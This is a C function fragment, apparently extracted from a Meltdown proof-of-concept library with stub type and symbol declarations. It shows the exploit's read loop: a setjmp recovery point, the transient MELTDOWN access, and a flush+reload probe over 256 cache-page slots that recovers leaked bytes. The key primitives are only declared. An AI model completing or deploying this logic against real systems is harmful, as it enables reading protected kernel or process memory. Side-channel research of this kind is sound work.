
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int uint64_t ;
struct TYPE_2__ {int retries; } ;


 int MELTDOWN ;
 int buf ;
 TYPE_1__ config ;
 scalar_t__ flush_reload (scalar_t__) ;
 scalar_t__ mem ;
 int sched_yield () ;
 int setjmp (int ) ;

int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
  size_t retries = config.retries + 1;
  uint64_t start = 0, end = 0;

  while (retries--) {
    if (!setjmp(buf)) {
      MELTDOWN;
    }

    int i;
    for (i = 0; i < 256; i++) {
      if (flush_reload(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}
